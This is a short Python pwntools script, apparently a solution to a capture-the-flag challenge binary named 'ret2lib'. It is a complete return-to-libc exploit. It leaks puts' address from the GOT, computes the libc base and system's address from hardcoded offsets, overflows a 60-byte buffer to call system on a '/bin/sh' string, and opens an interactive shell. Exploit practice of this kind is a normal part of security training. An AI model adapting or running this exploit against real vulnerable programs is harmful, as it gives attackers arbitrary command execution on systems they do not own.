#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = process('./ret2lib')

r.recvuntil(":")
puts_got = 0x0804a01c

r.sendline(str(puts_got))
r.recvuntil(": ")
puts_adr = int(r.recvuntil("\n").strip(),16)
puts_off = 0x5fca0
libc = puts_adr - puts_off
print "libc : ",hex(libc)
system = libc + 0x3ada0
sh = 0x804929e
r.recvuntil(":")
payload = "a"*60
payload += p32(system)
payload += "bbbb"
payload += p32(sh)
r.sendline(payload)
r.interactive()
